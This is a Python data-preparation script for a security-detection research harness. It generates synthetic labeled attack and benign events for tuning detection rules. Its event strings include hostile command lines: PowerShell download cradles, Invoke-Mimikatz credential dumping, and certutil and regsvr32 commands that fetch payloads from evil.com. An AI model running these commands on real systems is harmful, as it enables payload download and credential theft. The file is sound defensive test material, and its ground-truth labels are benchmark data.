"""
SecOps Autoresearch — Data Preparation
Generates labeled synthetic security events for detection rule optimization.

DO NOT MODIFY THIS FILE. The agent only modifies detect.py.

Usage:
    python prepare.py          # Generate data/events.json
    python prepare.py --stats  # Show dataset statistics
"""

import json
import os
import random
import hashlib
import string
import argparse
from datetime import datetime, timedelta


# ═══ Constants ═══════════════════════════════════════════════════════════════

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
EVENTS_FILE = os.path.join(DATA_DIR, "events.json")
UNLABELED_FILE = os.path.join(DATA_DIR, "events_unlabeled.json")
SEED = 42

# Internal IPs used for simulation
INTERNAL_IPS = [f"10.0.{i}.{j}" for i in range(1, 6) for j in range(10, 30)]
EXTERNAL_IPS = [f"203.0.113.{i}" for i in range(1, 50)] + \
               [f"198.51.100.{i}" for i in range(1, 50)]
BENIGN_DOMAINS = ["google.com", "microsoft.com", "github.com", "slack.com",
                  "zoom.us", "aws.amazon.com", "office365.com", "cdn.cloudflare.com",
                  "analytics.googleapis.com", "update.microsoft.com"]
USERS = [f"user{i}" for i in range(1, 20)] + ["admin", "svc_backup", "svc_deploy"]
MALICIOUS_DOMAINS = ["evil-c2.xyz", "data-drop.cc", "exfil-dns.ru",
                     "malware-cdn.tk", "phish-kit.top"]


# ═══ Event Generators ════════════════════════════════════════════════════════

def _ts(base: datetime, offset_minutes: float = 0) -> str:
    """Generate an ISO timestamp."""
    return (base + timedelta(minutes=offset_minutes)).isoformat() + "Z"


def _gen_brute_force(base_time: datetime, rng: random.Random) -> list:
    """T1110 — Brute Force: Rapid failed logins from a single attacker IP."""
    events = []
    attacker = rng.choice(EXTERNAL_IPS)
    target_user = rng.choice(USERS)
    count = rng.randint(8, 30)

    for i in range(count):
        events.append({
            "timestamp": _ts(base_time, i * 0.5),
            "sourcetype": "auth",
            "src_ip": attacker,
            "dest_ip": rng.choice(INTERNAL_IPS),
            "user": target_user,
            "action": "failure",
            "event_type": "authentication",
            "message": f"Failed login attempt for {target_user} from {attacker}",
            "label": "malicious",
            "attack_type": "brute_force",
            "mitre": "T1110"
        })

    # Followed by one success (attacker gets in)
    if rng.random() < 0.4:
        events.append({
            "timestamp": _ts(base_time, count * 0.5 + 1),
            "sourcetype": "auth",
            "src_ip": attacker,
            "dest_ip": rng.choice(INTERNAL_IPS),
            "user": target_user,
            "action": "success",
            "event_type": "authentication",
            "message": f"Successful login for {target_user} from {attacker} after failures",
            "label": "malicious",
            "attack_type": "brute_force",
            "mitre": "T1110"
        })

    return events


def _gen_dns_exfiltration(base_time: datetime, rng: random.Random) -> list:
    """T1048.003 — DNS Exfiltration: Long encoded DNS queries."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    base_domain = rng.choice(MALICIOUS_DOMAINS)
    count = rng.randint(10, 25)

    for i in range(count):
        # Generate long subdomain with base64-like encoding
        encoded = ''.join(rng.choices(string.ascii_lowercase + string.digits, k=rng.randint(40, 80)))
        query = f"{encoded}.{base_domain}"
        events.append({
            "timestamp": _ts(base_time, i * 2),
            "sourcetype": "dns",
            "src_ip": src,
            "dest_ip": "8.8.8.8",
            "query": query,
            "query_length": len(query),
            "query_type": "TXT",
            "event_type": "dns",
            "message": f"DNS query: {query[:60]}...",
            "label": "malicious",
            "attack_type": "dns_exfiltration",
            "mitre": "T1048.003"
        })

    return events


def _gen_c2_beaconing(base_time: datetime, rng: random.Random) -> list:
    """T1071 — C2 Beaconing: Periodic outbound connections."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    c2_ip = rng.choice(EXTERNAL_IPS)
    interval = rng.choice([60, 120, 300])  # seconds
    jitter = rng.uniform(0.05, 0.15)
    beacon_count = rng.randint(20, 60)

    for i in range(beacon_count):
        actual_interval = interval + rng.uniform(-interval * jitter, interval * jitter)
        events.append({
            "timestamp": _ts(base_time, i * (actual_interval / 60)),
            "sourcetype": "firewall",
            "src_ip": src,
            "dest_ip": c2_ip,
            "dest_port": rng.choice([443, 8443, 8080, 4444]),
            "action": "allowed",
            "direction": "outbound",
            "bytes_out": rng.randint(100, 500),
            "bytes_in": rng.randint(50, 200),
            "event_type": "network",
            "message": f"Outbound connection {src} -> {c2_ip}",
            "label": "malicious",
            "attack_type": "c2_beaconing",
            "mitre": "T1071"
        })

    return events


def _gen_lateral_movement(base_time: datetime, rng: random.Random) -> list:
    """T1021.002 — Lateral Movement via SMB."""
    events = []
    attacker = rng.choice(INTERNAL_IPS)
    targets = rng.sample([ip for ip in INTERNAL_IPS if ip != attacker], k=rng.randint(4, 8))

    for i, target in enumerate(targets):
        events.append({
            "timestamp": _ts(base_time, i * 3),
            "sourcetype": "firewall",
            "src_ip": attacker,
            "dest_ip": target,
            "dest_port": 445,
            "action": "allowed",
            "direction": "internal",
            "bytes_out": rng.randint(1000, 50000),
            "event_type": "network",
            "message": f"SMB connection {attacker} -> {target}:445",
            "label": "malicious",
            "attack_type": "lateral_movement",
            "mitre": "T1021.002"
        })

    return events


def _gen_powershell_abuse(base_time: datetime, rng: random.Random) -> list:
    """T1059.001 — Suspicious PowerShell execution."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    user = rng.choice(USERS)

    payloads = [
        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
        "pwsh -ExecutionPolicy Bypass -File payload.ps1",
        "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString",
        "powershell -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA",
        "powershell Invoke-Mimikatz -DumpCreds",
    ]

    cmd = rng.choice(payloads)
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "sysmon",
        "src_ip": src,
        "user": user,
        "process": "powershell.exe",
        "command_line": cmd,
        "parent_process": rng.choice(["cmd.exe", "explorer.exe", "wmiprvse.exe", "svchost.exe"]),
        "event_type": "process",
        "message": f"PowerShell execution: {cmd[:50]}...",
        "label": "malicious",
        "attack_type": "powershell_abuse",
        "mitre": "T1059.001"
    })

    return events


def _gen_privilege_escalation(base_time: datetime, rng: random.Random) -> list:
    """T1068 — Privilege Escalation."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    user = rng.choice([u for u in USERS if u != "admin" and not u.startswith("svc_")])

    commands = [
        f"sudo su - root",
        f"sudo /bin/bash",
        f"runas /user:admin cmd.exe",
        f"pkexec /bin/sh",
        f"sudo -l",
    ]

    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "auth",
        "src_ip": src,
        "user": user,
        "action": "escalation",
        "command": rng.choice(commands),
        "event_type": "authentication",
        "message": f"Privilege escalation attempt by {user}",
        "label": "malicious",
        "attack_type": "privilege_escalation",
        "mitre": "T1068"
    })

    return events


# ═══ STEALTHY attack variants (harder to detect) ═════════════════════════════

def _gen_slow_brute_force(base_time: datetime, rng: random.Random) -> list:
    """Low-and-slow brute force: few failures spread over hours."""
    events = []
    attacker = rng.choice(EXTERNAL_IPS)
    target_user = rng.choice(USERS)
    count = rng.randint(3, 4)  # under typical threshold

    for i in range(count):
        events.append({
            "timestamp": _ts(base_time, i * rng.randint(30, 120)),
            "sourcetype": "auth",
            "src_ip": attacker,
            "dest_ip": rng.choice(INTERNAL_IPS),
            "user": target_user,
            "action": "failure",
            "event_type": "authentication",
            "message": f"Failed login for {target_user}",
            "label": "malicious",
            "attack_type": "slow_brute_force",
            "mitre": "T1110"
        })

    return events


def _gen_stealthy_c2(base_time: datetime, rng: random.Random) -> list:
    """C2 with domain fronting — looks like normal HTTPS to known CDN."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    # Uses legitimate-looking dest but with unusual patterns
    fronting_ip = rng.choice(EXTERNAL_IPS)
    count = rng.randint(5, 12)

    for i in range(count):
        events.append({
            "timestamp": _ts(base_time, i * rng.randint(5, 20)),
            "sourcetype": "firewall",
            "src_ip": src,
            "dest_ip": fronting_ip,
            "dest_port": 443,
            "action": "allowed",
            "direction": "outbound",
            "bytes_out": rng.randint(50, 300),
            "bytes_in": rng.randint(50, 150),
            "event_type": "network",
            "message": f"HTTPS connection {src} -> {fronting_ip}:443",
            "label": "malicious",
            "attack_type": "stealthy_c2",
            "mitre": "T1071"
        })

    return events


def _gen_encoded_exfil(base_time: datetime, rng: random.Random) -> list:
    """Exfiltration via DNS with shorter queries that stay under typical thresholds."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    base_domain = rng.choice(MALICIOUS_DOMAINS)
    count = rng.randint(15, 30)

    for i in range(count):
        # Shorter encoded subdomains — under the 50-char threshold
        encoded = ''.join(rng.choices(string.ascii_lowercase + string.digits, k=rng.randint(15, 35)))
        query = f"{encoded}.{base_domain}"
        events.append({
            "timestamp": _ts(base_time, i * 3),
            "sourcetype": "dns",
            "src_ip": src,
            "dest_ip": "8.8.8.8",
            "query": query,
            "query_length": len(query),
            "query_type": "A",
            "event_type": "dns",
            "message": f"DNS query: {query}",
            "label": "malicious",
            "attack_type": "encoded_exfil",
            "mitre": "T1048.003"
        })

    return events


def _gen_fileless_attack(base_time: datetime, rng: random.Random) -> list:
    """Fileless attack using living-off-the-land binaries (LOLBins)."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    user = rng.choice(USERS)

    lolbins = [
        {"process": "mshta.exe", "command_line": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run\")", "parent": "explorer.exe"},
        {"process": "certutil.exe", "command_line": "certutil -urlcache -split -f http://evil.com/payload.exe", "parent": "cmd.exe"},
        {"process": "regsvr32.exe", "command_line": "regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll", "parent": "cmd.exe"},
        {"process": "rundll32.exe", "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"", "parent": "explorer.exe"},
        {"process": "wscript.exe", "command_line": "wscript.exe C:\\Users\\Public\\payload.vbs", "parent": "explorer.exe"},
    ]

    lolbin = rng.choice(lolbins)
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "sysmon",
        "src_ip": src,
        "user": user,
        "process": lolbin["process"],
        "command_line": lolbin["command_line"],
        "parent_process": lolbin["parent"],
        "event_type": "process",
        "message": f"{lolbin['process']} execution",
        "label": "malicious",
        "attack_type": "fileless_attack",
        "mitre": "T1218"
    })

    return events


# ═══ NOISY benign events (cause false positives) ═════════════════════════════

def _gen_noisy_auth(base_time: datetime, rng: random.Random) -> list:
    """Legitimate users with occasional failed logins (password typos, expired creds)."""
    events = []
    user = rng.choice(USERS)
    src = rng.choice(INTERNAL_IPS)
    # 2-4 failures followed by success — looks like password typo
    fail_count = rng.randint(2, 4)

    for i in range(fail_count):
        events.append({
            "timestamp": _ts(base_time, i * 0.2),
            "sourcetype": "auth",
            "src_ip": src,
            "dest_ip": rng.choice(INTERNAL_IPS),
            "user": user,
            "action": "failure",
            "event_type": "authentication",
            "message": f"Failed login for {user} (password typo)",
            "label": "benign",
            "attack_type": "none"
        })

    events.append({
        "timestamp": _ts(base_time, fail_count * 0.2 + 0.5),
        "sourcetype": "auth",
        "src_ip": src,
        "dest_ip": rng.choice(INTERNAL_IPS),
        "user": user,
        "action": "success",
        "event_type": "authentication",
        "message": f"Successful login for {user} after typos",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_long_dns_benign(base_time: datetime, rng: random.Random) -> list:
    """Long but benign DNS queries — CDN, analytics, cloud services."""
    events = []
    long_domains = [
        f"us-west-2.ec2.internal.{'x' * rng.randint(30, 50)}.aws.amazon.com",
        f"tracker-{''.join(rng.choices(string.ascii_lowercase, k=40))}.analytics.googleapis.com",
        f"{''.join(rng.choices(string.ascii_lowercase + string.digits, k=35))}.cloudfront.net",
        f"appservice-{''.join(rng.choices(string.hexdigits.lower(), k=32))}.azurewebsites.net",
        f"{''.join(rng.choices(string.ascii_lowercase, k=25))}.update.microsoft.com",
    ]

    query = rng.choice(long_domains)
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "dns",
        "src_ip": rng.choice(INTERNAL_IPS),
        "dest_ip": rng.choice(["8.8.8.8", "1.1.1.1"]),
        "query": query,
        "query_length": len(query),
        "query_type": rng.choice(["A", "AAAA", "CNAME"]),
        "event_type": "dns",
        "message": f"DNS query: {query[:60]}...",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_admin_smb(base_time: datetime, rng: random.Random) -> list:
    """IT admin doing legitimate SMB connections to multiple servers (patch deployment, etc.)."""
    events = []
    admin_ip = rng.choice(INTERNAL_IPS[:5])  # admins on first subnet
    targets = rng.sample(INTERNAL_IPS[5:], k=rng.randint(4, 10))

    for i, target in enumerate(targets):
        events.append({
            "timestamp": _ts(base_time, i * 5),
            "sourcetype": "firewall",
            "src_ip": admin_ip,
            "dest_ip": target,
            "dest_port": 445,
            "action": "allowed",
            "direction": "internal",
            "bytes_out": rng.randint(5000, 500000),
            "event_type": "network",
            "message": f"SMB admin connection {admin_ip} -> {target}:445",
            "label": "benign",
            "attack_type": "none"
        })

    return events


def _gen_legit_powershell(base_time: datetime, rng: random.Random) -> list:
    """Legitimate PowerShell usage — sysadmin scripts, configuration management."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    user = rng.choice(["admin", "svc_deploy", "svc_backup"])

    legit_commands = [
        "powershell Get-Service | Where-Object {$_.Status -eq 'Running'}",
        "powershell -File C:\\Scripts\\backup.ps1",
        "pwsh -Command Get-Process | Sort-Object CPU -Descending",
        "powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser",
        "powershell Import-Module ActiveDirectory; Get-ADUser -Filter *",
    ]

    cmd = rng.choice(legit_commands)
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "sysmon",
        "src_ip": src,
        "user": user,
        "process": rng.choice(["powershell.exe", "pwsh.exe"]),
        "command_line": cmd,
        "parent_process": rng.choice(["explorer.exe", "services.exe", "svchost.exe"]),
        "event_type": "process",
        "message": f"PowerShell: {cmd[:50]}...",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_legit_sudo(base_time: datetime, rng: random.Random) -> list:
    """Legitimate sudo usage — normal admin tasks."""
    events = []
    user = rng.choice([u for u in USERS if u != "admin" and not u.startswith("svc_")])
    src = rng.choice(INTERNAL_IPS)

    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "auth",
        "src_ip": src,
        "user": user,
        "action": "escalation",
        "command": rng.choice(["sudo apt update", "sudo systemctl restart nginx", "sudo cat /var/log/syslog"]),
        "event_type": "authentication",
        "message": f"Authorized sudo by {user}",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_chatty_service(base_time: datetime, rng: random.Random) -> list:
    """Service that sends many outbound requests to same IP (looks like beaconing)."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    dest = rng.choice(EXTERNAL_IPS)
    count = rng.randint(20, 50)

    for i in range(count):
        events.append({
            "timestamp": _ts(base_time, i * rng.uniform(0.5, 3)),
            "sourcetype": "firewall",
            "src_ip": src,
            "dest_ip": dest,
            "dest_port": 443,
            "action": "allowed",
            "direction": "outbound",
            "bytes_out": rng.randint(500, 5000),
            "bytes_in": rng.randint(1000, 50000),
            "event_type": "network",
            "message": f"API service {src} -> {dest}:443",
            "label": "benign",
            "attack_type": "none"
        })

    return events


def _gen_normal_auth(base_time: datetime, rng: random.Random) -> list:
    """Normal clean authentication events."""
    events = []
    user = rng.choice(USERS)
    events.append({
        "timestamp": _ts(base_time, rng.randint(0, 60)),
        "sourcetype": "auth",
        "src_ip": rng.choice(INTERNAL_IPS),
        "dest_ip": rng.choice(INTERNAL_IPS),
        "user": user,
        "action": "success",
        "event_type": "authentication",
        "message": f"Login event for {user}",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_normal_dns(base_time: datetime, rng: random.Random) -> list:
    """Normal DNS events."""
    events = []
    domain = rng.choice(BENIGN_DOMAINS)
    subdomain = rng.choice(["www", "api", "cdn", "mail", ""])
    query = f"{subdomain}.{domain}" if subdomain else domain
    events.append({
        "timestamp": _ts(base_time, rng.randint(0, 30)),
        "sourcetype": "dns",
        "src_ip": rng.choice(INTERNAL_IPS),
        "dest_ip": rng.choice(["8.8.8.8", "1.1.1.1", "10.0.1.1"]),
        "query": query,
        "query_length": len(query),
        "query_type": rng.choice(["A", "AAAA", "CNAME"]),
        "event_type": "dns",
        "message": f"DNS query: {query}",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_normal_firewall(base_time: datetime, rng: random.Random) -> list:
    """Normal firewall events."""
    events = []
    events.append({
        "timestamp": _ts(base_time, rng.randint(0, 30)),
        "sourcetype": "firewall",
        "src_ip": rng.choice(INTERNAL_IPS),
        "dest_ip": rng.choice(EXTERNAL_IPS),
        "dest_port": rng.choice([80, 443, 8080, 22, 53]),
        "action": "allowed",
        "direction": "outbound",
        "bytes_out": rng.randint(500, 100000),
        "bytes_in": rng.randint(200, 500000),
        "event_type": "network",
        "message": "Outbound web traffic",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_normal_process(base_time: datetime, rng: random.Random) -> list:
    """Normal process creation events."""
    normal_procs = ["chrome.exe", "outlook.exe", "code.exe", "python.exe",
                    "node.exe", "java.exe", "slack.exe", "teams.exe"]

    return [{
        "timestamp": _ts(base_time),
        "sourcetype": "sysmon",
        "src_ip": rng.choice(INTERNAL_IPS),
        "user": rng.choice(USERS),
        "process": rng.choice(normal_procs),
        "command_line": "",
        "parent_process": "explorer.exe",
        "event_type": "process",
        "message": "Normal process creation",
        "label": "benign",
        "attack_type": "none"
    }]


# ═══ Dataset Generation ══════════════════════════════════════════════════════

# Standard attacks (catchable with good rules)
ATTACK_GENERATORS = {
    "brute_force":          (_gen_brute_force, 12),
    "dns_exfiltration":     (_gen_dns_exfiltration, 8),
    "c2_beaconing":         (_gen_c2_beaconing, 6),
    "lateral_movement":     (_gen_lateral_movement, 10),
    "powershell_abuse":     (_gen_powershell_abuse, 18),
    "privilege_escalation": (_gen_privilege_escalation, 12),
}

# Stealthy attacks (harder to detect — distinguishes good from great detection)
STEALTHY_GENERATORS = {
    "slow_brute_force":     (_gen_slow_brute_force, 20),
    "stealthy_c2":          (_gen_stealthy_c2, 10),
    "encoded_exfil":        (_gen_encoded_exfil, 8),
    "fileless_attack":      (_gen_fileless_attack, 15),
}

# Benign events (including noisy ones that cause false positives)
BENIGN_GENERATORS = [
    (_gen_normal_auth, 60),
    (_gen_normal_dns, 80),
    (_gen_normal_firewall, 60),
    (_gen_normal_process, 50),
]

# Noisy benign (designed to trigger false positives in naive rules)
NOISY_BENIGN_GENERATORS = [
    (_gen_noisy_auth, 25),         # password typos look like brute force
    (_gen_long_dns_benign, 30),    # CDN domains look like DNS exfil
    (_gen_admin_smb, 8),           # admin SMB looks like lateral movement
    (_gen_legit_powershell, 20),   # legit PS looks like abuse
    (_gen_legit_sudo, 15),         # legit sudo looks like privesc
    (_gen_chatty_service, 6),      # API services look like beaconing
]


def generate_dataset() -> list:
    """Generate the full labeled dataset."""
    rng = random.Random(SEED)
    base_time = datetime(2026, 3, 1, 0, 0, 0)
    all_events = []

    # Generate standard attack events
    for attack_name, (gen_fn, count) in ATTACK_GENERATORS.items():
        for i in range(count):
            offset = rng.randint(0, 1440)
            events = gen_fn(base_time + timedelta(minutes=offset), rng)
            all_events.extend(events)

    # Generate stealthy attack events
    for attack_name, (gen_fn, count) in STEALTHY_GENERATORS.items():
        for i in range(count):
            offset = rng.randint(0, 1440)
            events = gen_fn(base_time + timedelta(minutes=offset), rng)
            all_events.extend(events)

    # Generate clean benign events
    for gen_fn, count in BENIGN_GENERATORS:
        for i in range(count):
            offset = rng.randint(0, 1440)
            events = gen_fn(base_time + timedelta(minutes=offset), rng)
            all_events.extend(events)

    # Generate noisy benign events (false positive bait)
    for gen_fn, count in NOISY_BENIGN_GENERATORS:
        for i in range(count):
            offset = rng.randint(0, 1440)
            events = gen_fn(base_time + timedelta(minutes=offset), rng)
            all_events.extend(events)

    # Shuffle to simulate real-world ordering
    rng.shuffle(all_events)

    # Assign unique event IDs
    for i, event in enumerate(all_events):
        event["event_id"] = f"EVT-{i+1:05d}"

    return all_events


def strip_labels(events: list) -> list:
    """Remove labels for the agent-facing dataset."""
    unlabeled = []
    for event in events:
        clean = {k: v for k, v in event.items() if k not in ("label", "attack_type", "mitre")}
        unlabeled.append(clean)
    return unlabeled


def print_stats(events: list):
    """Print dataset statistics."""
    total = len(events)
    malicious = [e for e in events if e["label"] == "malicious"]
    benign = [e for e in events if e["label"] == "benign"]

    print(f"\n{'═' * 60}")
    print(f"  SecOps Autoresearch — Dataset Statistics")
    print(f"{'═' * 60}")
    print(f"  Total events:     {total}")
    print(f"  Malicious events: {len(malicious)} ({100*len(malicious)/total:.1f}%)")
    print(f"  Benign events:    {len(benign)} ({100*len(benign)/total:.1f}%)")
    print()

    # Attack type breakdown
    attack_types = {}
    for e in malicious:
        at = e.get("attack_type", "unknown")
        attack_types[at] = attack_types.get(at, 0) + 1

    print(f"  Attack breakdown:")
    for at, count in sorted(attack_types.items(), key=lambda x: -x[1]):
        print(f"    {at:25s} {count:5d} events")

    # Event type breakdown
    print(f"\n  Event types:")
    event_types = {}
    for e in events:
        et = e.get("event_type", "unknown")
        event_types[et] = event_types.get(et, 0) + 1
    for et, count in sorted(event_types.items(), key=lambda x: -x[1]):
        print(f"    {et:25s} {count:5d} events")

    print(f"{'═' * 60}\n")


# ═══ Main ═════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SecOps Autoresearch — Data Preparation")
    parser.add_argument("--stats", action="store_true", help="Show dataset statistics only")
    args = parser.parse_args()

    # Ensure data directory exists
    os.makedirs(DATA_DIR, exist_ok=True)

    # Generate or load events
    if os.path.exists(EVENTS_FILE) and args.stats:
        with open(EVENTS_FILE, "r") as f:
            events = json.load(f)
        print_stats(events)
    else:
        print("Generating synthetic security events...")
        events = generate_dataset()

        # Save labeled (ground truth)
        with open(EVENTS_FILE, "w") as f:
            json.dump(events, f, indent=2)
        print(f"  ✅ Labeled events saved to {EVENTS_FILE}")

        # Save unlabeled (agent-facing)
        unlabeled = strip_labels(events)
        with open(UNLABELED_FILE, "w") as f:
            json.dump(unlabeled, f, indent=2)
        print(f"  ✅ Unlabeled events saved to {UNLABELED_FILE}")

        print_stats(events)
        print("Data preparation complete. Ready for experiments.")
